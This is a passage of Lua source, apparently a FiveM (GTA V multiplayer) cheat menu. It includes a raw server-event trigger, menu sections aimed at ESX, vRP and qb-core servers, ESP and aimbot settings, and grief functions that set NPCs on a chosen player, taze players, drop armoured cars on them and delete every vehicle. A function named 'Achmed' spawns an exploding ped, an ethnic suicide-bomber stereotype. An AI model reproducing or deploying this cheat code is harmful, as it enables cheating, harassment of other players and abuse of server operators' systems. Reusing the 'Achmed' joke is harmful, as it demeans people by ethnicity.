        if props.modArmor ~= nil then SetVehicleMod(vehicle, 16, props.modArmor, false) end

        if props.modTurbo ~= nil then ToggleVehicleMod(vehicle, 18, props.modTurbo) end

        if props.modXenon ~= nil then ToggleVehicleMod(vehicle, 22, props.modXenon) end

        if props.modFrontWheels ~= nil then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end

        if props.modBackWheels ~= nil then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end

        if props.modPlateHolder ~= nil then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end

        if props.modVanityPlate ~= nil then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end

        if props.modTrimA ~= nil then SetVehicleMod(vehicle, 27, props.modTrimA, false) end

        if props.modOrnaments ~= nil then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end

        if props.modDashboard ~= nil then SetVehicleMod(vehicle, 29, props.modDashboard, false) end

        if props.modDial ~= nil then SetVehicleMod(vehicle, 30, props.modDial, false) end

        if props.modDoorSpeaker ~= nil then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end

        if props.modSeats ~= nil then SetVehicleMod(vehicle, 32, props.modSeats, false) end

        if props.modSteeringWheel ~= nil then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end

        if props.modShifterLeavers ~= nil then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end

        if props.modAPlate ~= nil then SetVehicleMod(vehicle, 35, props.modAPlate, false) end

        if props.modSpeakers ~= nil then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end

        if props.modTrunk ~= nil then SetVehicleMod(vehicle, 37, props.modTrunk, false) end

        if props.modHydrolic ~= nil then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end

        if props.modEngineBlock ~= nil then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end

        if props.modAirFilter ~= nil then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end

        if props.modStruts ~= nil then SetVehicleMod(vehicle, 41, props.modStruts, false) end

        if props.modArchCover ~= nil then SetVehicleMod(vehicle, 42, props.modArchCover, false) end

        if props.modAerials ~= nil then SetVehicleMod(vehicle, 43, props.modAerials, false) end

        if props.modTrimB ~= nil then SetVehicleMod(vehicle, 44, props.modTrimB, false) end

        if props.modTank ~= nil then SetVehicleMod(vehicle, 45, props.modTank, false) end

        if props.modWindows ~= nil then SetVehicleMod(vehicle, 46, props.modWindows, false) end

        if props.modLivery ~= nil then
            SetVehicleMod(vehicle, 48, props.modLivery, false)
            SetVehicleLivery(vehicle, props.modLivery)
        end
    end

    FiveM.DeleteVehicle = function(vehicle)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    end

    FiveM.DirtyVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 15.0) end

    FiveM.CleanVehicle = function(vehicle) SetVehicleDirtLevel(vehicle, 1.0) end

    FiveM.GetPlayers = function()
        local players    = {}
        for i=0, 255, 1 do
            local ped = GetPlayerPed(i)
            if DoesEntityExist(ped) then
                table.insert(players, i)
            end
        end
        return players
    end

    FiveM.GetClosestPlayer = function(coords)
        local players         = FiveM.GetPlayers()
        local closestDistance = -1
        local closestPlayer   = -1
        local usePlayerPed    = false
        local playerPed       = PlayerPedId()
        local playerId        = PlayerId()

        if coords == nil then
            usePlayerPed = true
            coords       = GetEntityCoords(playerPed)
        end

        for i=1, #players, 1 do
            local target = GetPlayerPed(players[i])

            if not usePlayerPed or (usePlayerPed and players[i] ~= playerId) then
                local targetCoords = GetEntityCoords(target)
                local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

                if closestDistance == -1 or closestDistance > distance then
                    closestPlayer   = players[i]
                    closestDistance = distance
                end
            end
        end

        return closestPlayer, closestDistance
    end

    FiveM.GetWaypoint = function()
        local g_Waypoint = nil;
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
            local blipIterator = GetBlipInfoIdIterator(8)
            local blip = GetFirstBlipInfoId(8, blipIterator)
            g_Waypoint = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector());
        end
        print(g_Waypoint);
        return g_Waypoint;
    end

    FiveM.GetSafePlayerName = function(name)
        if string.IsNullOrEmpty(name) then return "" end;
        return name:gsub("%^", "\\^"):gsub("%~", "\\~"):gsub("%<", "«"):gsub("%>", "»");
    end

    FiveM.SetResourceLocked = function(resource, item)
        Citizen.CreateThread(function()
            if item ~= nil then local item_type, item_subtype = item(); end

            if GetResourceState(resource) == "started" then
                if item ~= nil then item:Enabled(true); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.None); end;
            else
                if item ~= nil then item:Enabled(false); end;
                if item_subtype == "UIMenuItem" then item:SetRightBadge(BadgeStyle.Lock); end;
            end
        end)
    end

    FiveM.TriggerCustomEvent = function(server, event, ...)
        local payload = msgpack.pack({...})
        if server then
            TriggerServerEventInternal(event, payload, payload:len())
        else
            TriggerEventInternal(event, payload, payload:len())
        end
    end
end

TriggerCustomEvent = function(server, event, ...)
    local payload = msgpack.pack({...})
    if server then
        TriggerServerEventInternal(event, payload, payload:len())
    else
        TriggerEventInternal(event, payload, payload:len())
    end
end

local function RequestNetworkControl(Request)
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone)
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

local function SelfRagdollThread()
	while FiveM.Toggle.SelfRagdoll do
		SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		Wait(5)
	end
end

local function SelfRagdoll()
	FiveM.Toggle.SelfRagdoll = not FiveM.Toggle.SelfRagdoll

	if FiveM.Toggle.SelfRagdoll then
		CreateThread(SelfRagdollThread)
	end
end

RequestWeaponAsset(`WEAPON_STUNGUN`)

local function TazePlayer(player)
	local ped = GetPlayerPed(player)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

local function Achmed()
    local model = GetHashKey('mp_m_freemode_01')
    if model then
        local ped = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -1.0, -1.0), GetEntityHeading(pped), true, true)
        
        SetPedDefaultComponentVariation(ped)
        SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
        SetPedComponentVariation(ped, 1, 115, 0, 2)
        SetPedComponentVariation(ped, 3, 4, 0, 2)
        SetPedComponentVariation(ped, 11, 12, 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 4, 56, 0, 2)
        SetPedComponentVariation(ped, 6, 34, 0, 2)
        
        CreateThread(function()
            PlayPain(ped, 6, 0, 0)
            Wait(500)
            AddExplosion(GetEntityCoords(ped), 34, 500.0, true, false, false, false)
        end)
    end
end

local function ReturnRGB(l) local rgb = {} local n = GetGameTimer() / 200 rgb.r = math.floor(math.sin(n * l + 0) * 127 + 128) rgb.g = math.floor(math.sin(n * l + 2) * 127 + 128) rgb.b = math.floor(math.sin(n * l + 4) * 127 + 128) return rgb end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function qp()
	local qq = {
		"freight",
		"freightcar",
		"freightgrain",
		"freightcont1",
		"freightcont2",
		"freighttrailer"
	}
	for i = 1, 6 do
		RequestModel(GetHashKey(qq[i]))
		while not HasModelLoaded(GetHashKey(qq[i])) do
			Citizen.Wait(0)
		end
	end;
	local qr = GetEntityCoords(PlayerPedId(), false)
	local qs = CreateMissionTrain(15, qr.x, qr.y, qr.z, 1)
	SetVehicleUndriveable(qs, false)
	TaskWarpPedIntoVehicle(PlayerPedId(), qs, -1)
	local qt = true;
	trainSpeed = 5;
	if qt then
		if GetVehiclePedIsIn(PlayerPedId(), false) == qs then
			local qu = "Train speed is : ~b~"..tostring(trainSpeed)
			ob(qu)
			if GetGameTimer() >= timer then
				SetTrainSpeed(qs, trainSpeed)
				timer = GetGameTimer() + 10
			end;
			if IsDisabledControlJustReleased(1, 188) then
				trainSpeed = trainSpeed + 0.1;
				ob(qu)
			elseif IsDisabledControlJustReleased(1, 187) then
				if trainSpeed - 0.1 >= 0 then
					trainSpeed = trainSpeed - 0.1
				end
				ob(qu)
			end
		end
	end
end
local function qv()
	DeleteAllTrains()
	DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
	DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
	for qw in EnumerateVehicles() do
		if qw ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
			SetEntityAsMissionEntity(GetVehiclePedIsIn(qw, true), 1, 1)
			DeleteEntity(GetVehiclePedIsIn(qw, true))
			SetEntityAsMissionEntity(qw, 1, 1)
			DeleteEntity(qw)
		end
	end;
	DeleteVehicle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
end

local function pC(pD)
	local pE = GetPlayerPed(pD)
	local pF = GetEntityCoords(pE, true)
	local pG = GetHashKey("insurgent2")
	RequestModel(pG)
	while not HasModelLoaded(pG) do
		Citizen.Wait(0)
	end;
	local pH = CreateVehicle(GetHashKey("insurgent2"), pF.x, pF.y, pF.z + 20.0, 0.0, true, false)
	SetEntityVelocity(pH, 0.0, 0.0, -100.0)
end
local function pI(pJ)
	local pK = GetPlayerPed(pJ)
	local pL = GetEntityCoords(pK, true)
	local pM = GetHashKey("insurgent2")
	local pN = GetEntityHeading(pK)
	RequestModel(pM)
	while not HasModelLoaded(pM) do
		Citizen.Wait(0)
	end;
	local bv = CreateVehicle(GetHashKey("insurgent2"), pL.x, pL.y, pL.z + 100.0, pN, true, false)
	SetEntityVelocity(bv, 0.0, 0.0, -5000.0)
	FiveM.Subtitle("Spawned car above player and smashed him ~r~HARDER.")
end

local function RGB(speed, ismenu)
    local res = {}

    for k, v in pairs({0, 2, 4}) do
        local Time = GetGameTimer() / 200
        table.insert(res, math.floor(math.sin(Time * (speed or 0.2) + v) * 127 + 128))
    end

    table.insert(res, 255)

    return res
end

local MainColor = {
	r = 225, 
	g = 55, 
	b = 55,
	a = 255
}

menulist = {
        
        'Falcon',
        'player',
        'self',
        'weapon',
        'vehicle',
        'world',
        'misc',
        'teleport',
        'lua',
        'settings',
        'fuck',
        'objects',
        'cred',
        'Models',
        'powers',
		
        'allplayer',
        'playeroptions',
        'trollmenu',
        'giveweapon',
        'playerveh',
        'weaponspawnerplayer',
        'WeaponCustomization',
        
        'appearance',
        'modifyskintextures',
          'modifyhead',
        'modifiers',
        
        'weaponspawner',
        
        'melee',
        'pistol',
        'shotgun',
        'smg',
        'assault',
        'sniper',
        'thrown',
        'heavy',
        
        'vehiclespawner',
        'vehiclemods',
        'VehBoostMenu',
        'VehTorque',
        'vehiclemenu',
        
        'vehiclecolors',
        'vehiclecolors_primary',
        'vehiclecolors_secondary',
        'primary_classic',
        'primary_matte',
        'primary_metal',
        'secondary_classic',
        'secondary_matte',
        'secondary_metal',
        
        'vehicletuning',
        
        'compacts',
        'sedans',
        'suvs',
        'coupes',
        'muscle',
        'sportsclassics',
        'sports',
        'super',
        'motorcycles',
        'offroad',
        'industrial',
        'utility',
        'vans',
        'cycles',
        'boats',
        'helicopters',
        'planes',
        'service',
        'commercial',
        
        
        'objectspawner',
        'objectlist',
        'weather',
        'time',
        'serverOptionsResources',
        
		'esp',
		'keybindings',
		'webradio',
        'credits',
        'info',
        'devo',
        'qb-core',
		
        'saveload',
        'pois',
        
        'esx',
        'vrp',
        'other',
        'devo',
        'qb-core'
}




faceItemsList = {}
faceTexturesList = {}
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}


NoclipSpeedOps = {1, 5, 10, 20, 30}

NoclipSpeed = 1
oldSpeed = nil


ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}

ForcefieldRadius = 5.0


FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

FastRunMultiplier = 1.0
FastSwimMultiplier = 1.0


RotationOps = {0, 45, 90, 135, 180}

ObjRotation = 90


GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

GravAmount = 9.8


SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
SpeedModAmt = 1.0
SpeedModWords = {"+0%", "+10%", "+20%", "+30%", "+40%", "+60%", "+70%", "+80%", "+90%", "+100%"}

SpeedModOps2 = {1.0, 2.0, 4.0, 8.0, 16.0, 32.0, 64.0, 128.0, 512.0, 5012.0}
SpeedModAmt2 = 1.0

ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
EspDistance = 500.0


ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
ESPRefreshTime = 0


AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"


ClothingSlots = {1, 2, 3, 4, 5}


PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

PedAttackType = 1


RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
RadiosListWords = {
    "Los Santos Rock Radio",
    "Non-Stop-Pop FM",
    "Radio Los Santos",
    "Channel X",
    "West Coast Talk Radio",
    "Rebel Radio",
    "Soulwax FM",
    "East Los FM",
    "West Coast Classics",
    "Blue Ark",
    "Worldwide FM",
    "FlyLo FM",
    "The Lowdown 91.1",
    "The Lab",
    "Radio Mirror Park",
    "Space 103.2",
    "Vinewood Boulevard Radio",
    "Blonded Los Santos 97.8 FM",
    "Blaine County Radio",
}

WeathersList = { 
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}


objs_tospawn = {
    "stt_prop_stunt_track_start",
    "prop_container_01a",
    "prop_contnr_pile_01a",
    "ce_xr_ctr2",
    "stt_prop_ramp_jump_xxl",
    "hei_prop_carrier_jet",
    "prop_parking_hut_2",
    "csx_seabed_rock3_",
    "db_apart_03_",
    "db_apart_09_",
    "stt_prop_stunt_tube_l",
    "stt_prop_stunt_track_dwuturn",
    "xs_prop_hamburgher_wl",
    "sr_prop_spec_tube_xxs_01a"
}

local allweapons = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    

    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    

    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    

    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    

    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    

    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    

    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    

    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN",
}

local meleeweapons = {
    {"WEAPON_KNIFE", "Knife"},
    {"WEAPON_KNUCKLE", "Brass Knuckles"},
    {"WEAPON_NIGHTSTICK", "Nightstick"},
    {"WEAPON_HAMMER", "Hammer"},
    {"WEAPON_BAT", "Baseball Bat"},
    {"WEAPON_GOLFCLUB", "Golf Club"},
    {"WEAPON_CROWBAR", "Crowbar"},
    {"WEAPON_BOTTLE", "Bottle"},
    {"WEAPON_DAGGER", "Dagger"},
    {"WEAPON_HATCHET", "Hatchet"},
    {"WEAPON_MACHETE", "Machete"},
    {"WEAPON_FLASHLIGHT", "Flashlight"},
    {"WEAPON_SWITCHBLADE", "Switchblade"},
    {"WEAPON_POOLCUE", "Pool Cue"},
    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
}

local thrownweapons = {
    {"WEAPON_GRENADE", "Grenade"},
    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
    {"WEAPON_PROXMINE", "Proximity Mine"},
    {"WEAPON_BZGAS", "BZ Gas"},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
    {"WEAPON_MOLOTOV", "Molotov"},
    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
    {"WEAPON_PETROLCAN", "Fuel Can"},
    {"WEAPON_SNOWBALL", "Snowball"},
    {"WEAPON_FLARE", "Flare"},
    {"WEAPON_BALL", "Baseball"}
}

local pistolweapons = {
    {"WEAPON_PISTOL", "Pistol"},
    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
    {"WEAPON_APPISTOL", "AP Pistol"},
    {"WEAPON_REVOLVER", "Revolver"},
    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
    {"WEAPON_PISTOL50", "Pistol .50"},
    {"WEAPON_SNSPISTOL", "SNS Pistol"},
    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
    {"WEAPON_STUNGUN", "Tazer"},
    {"WEAPON_FLAREGUN", "Flaregun"},
    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
}

local smgweapons = {
    {"WEAPON_MICROSMG", "Micro SMG"},
    {"WEAPON_MINISMG", "Mini SMG"},
    {"WEAPON_SMG", "SMG"},
    {"WEAPON_SMG_MK2", "SMG Mk II"},
    {"WEAPON_ASSAULTSMG", "Assault SMG"},
    {"WEAPON_COMBATPDW", "Combat PDW"},
    {"WEAPON_GUSENBERG", "Gunsenberg"},
    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
    {"WEAPON_MG", "MG"},
    {"WEAPON_COMBATMG", "Combat MG"},
    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
}

local assaultweapons = {
    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
}

local shotgunweapons = {
    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
    {"WEAPON_MUSKET", "Musket"},
    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
}

local sniperweapons = {
    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
}

local heavyweapons = {
    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
    {"WEAPON_RPG", "RPG"},
    {"WEAPON_MINIGUN", "Minigun"},
    {"WEAPON_FIREWORK", "Firework Launcher"},
    {"WEAPON_RAILGUN", "Railgun"},
    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
    {"WEAPON_RAYMINIGUN", "Widowmaker"}
}

local compacts = {
    "BLISTA",
    "BRIOSO",
    "DILETTANTE",
    "DILETTANTE2",
    "ISSI2",
    "ISSI3",
    "ISSI4",
    "ISSI5",
    "ISSI6",
    "PANTO",
    "PRAIRIE",
    "RHAPSODY"
}

local sedans = {
    "ASEA",
    "ASEA2",
    "ASTEROPE",
    "COG55",
    "COG552",
    "COGNOSCENTI",
    "COGNOSCENTI2",
    "EMPEROR",
    "EMPEROR2",
    "EMPEROR3",
    "FUGITIVE",
    "GLENDALE",
    "INGOT",
    "INTRUDER",
    "LIMO2",
    "PREMIER",
    "PRIMO",
    "PRIMO2",
    "REGINA",
    "ROMERO",
    "SCHAFTER2",
    "SCHAFTER5",
    "SCHAFTER6",
    "STAFFORD",
    "STANIER",
    "STRATUM",
    "STRETCH",
    "SUPERD",
    "SURGE",
    "TAILGATER",
    "WARRENER",
    "WASHINGTON"
}

local suvs = {
    "BALLER",
    "BALLER2",
    "BALLER3",
    "BALLER4",
    "BALLER5",
    "BALLER6",
    "BJXL",
    "CAVALCADE",
    "CAVALCADE2",
    "CONTENDER",
    "DUBSTA",
    "DUBSTA2",
    "FQ2",
    "GRANGER",
    "GRESLEY",
    "HABANERO",
    "HUNTLEY",
    "LANDSTALKER",
    "MESA",
    "MESA2",
    "PATRIOT",
    "PATRIOT2",
    "RADI",
    "ROCOTO",
    "SEMINOLE",
    "SERRANO",
    "TOROS",
    "XLS",
    "XLS2"
}

local coupes = {
    "COGCABRIO",
    "EXEMPLAR",
    "F620",
    "FELON",
    "FELON2",
    "JACKAL",
    "ORACLE",
    "ORACLE2",
    "SENTINEL",
    "SENTINEL2",
    "WINDSOR",
    "WINDSOR2",
    "ZION",
    "ZION2"
}

local muscle = {
    "BLADE",
    "BUCCANEER",
    "BUCCANEER2",
    "CHINO",
    "CHINO2",
    "CLIQUE",
    "COQUETTE3",
    "DEVIANT",
    "DOMINATOR",
    "DOMINATOR2",
    "DOMINATOR3",
    "DOMINATOR4",
    "DOMINATOR5",
    "DOMINATOR6",
    "DUKES",
    "DUKES2",
    "ELLIE",
    "FACTION",
    "FACTION2",
    "FACTION3",
    "GAUNTLET",
    "GAUNTLET2",
    "HERMES",
    "HOTKNIFE",
    "HUSTLER",
    "IMPALER",
    "IMPALER2",
    "IMPALER3",
    "IMPALER4",
    "IMPERATOR",
    "IMPERATOR2",
    "IMPERATOR3",
    "LURCHER",
    "MOONBEAM",
    "MOONBEAM2",
    "NIGHTSHADE",
    "PHOENIX",
    "PICADOR",
    "RATLOADER",
    "RATLOADER2",
    "RUINER",
    "RUINER2",
    "RUINER3",
    "SABREGT",
    "SABREGT2",
    "SLAMVAN",
    "SLAMVAN2",
    "SLAMVAN3",
    "SLAMVAN4",
    "SLAMVAN5",
    "SLAMVAN6",
    "STALION",
    "STALION2",
    "TAMPA",
    "TAMPA3",
    "TULIP",
    "VAMOS",
    "VIGERO",
    "VIRGO",
    "VIRGO2",
    "VIRGO3",
    "VOODOO",
    "VOODOO2",
    "YOSEMITE"
}

local sportsclassics = {
    "ARDENT",
    "BTYPE",
    "BTYPE2",
    "BTYPE3",
    "CASCO",
    "CHEBUREK",
    "CHEETAH2",
    "COQUETTE2",
    "DELUXO",
    "FAGALOA",
    "FELTZER3",
    "GT500",
    "INFERNUS2",
    "JB700",
    "JESTER3",
    "MAMBA",
    "MANANA",
    "MICHELLI",
    "MONROE",
    "PEYOTE",
    "PIGALLE",
    "RAPIDGT3",
    "RETINUE",
    "SAVESTRA",
    "STINGER",
    "STINGERGT",
    "STROMBERG",
    "SWINGER",
    "TORERO",
    "TORNADO",
    "TORNADO2",
    "TORNADO3",
    "TORNADO4",
    "TORNADO5",
    "TORNADO6",
    "TURISMO2",
    "VISERIS",
    "Z190",
    "ZTYPE"
}

local sports = {
    "ALPHA",
    "BANSHEE",
    "BESTIAGTS",
    "BLISTA2",
    "BLISTA3",
    "BUFFALO",
    "BUFFALO2",
    "BUFFALO3",
    "CARBONIZZARE",
    "COMET2",
    "COMET3",
    "COMET4",
    "COMET5",
    "COQUETTE",
    "ELEGY",
    "ELEGY2",
    "FELTZER2",
    "FLASHGT",
    "FUROREGT",
    "FUSILADE",
    "FUTO",
    "GB200",
    "HOTRING",
    "ITALIGTO",
    "JESTER",
    "JESTER2",
    "KHAMELION",
    "KURUMA",
    "KURUMA2",
    "LYNX",
    "MASSACRO",
    "MASSACRO2",
    "NEON",
    "NINEF",
    "NINEF2",
    "OMNIS",
    "PARIAH",
    "PENUMBRA",
    "RAIDEN",
    "RAPIDGT",
    "RAPIDGT2",
    "RAPTOR",
    "REVOLTER",
    "RUSTON",
    "SCHAFTER2",
    "SCHAFTER3",
    "SCHAFTER4",
    "SCHAFTER5",
    "SCHLAGEN",
    "SCHWARZER",
    "SENTINEL3",
    "SEVEN70",
    "SPECTER",
    "SPECTER2",
    "SULTAN",
    "SURANO",
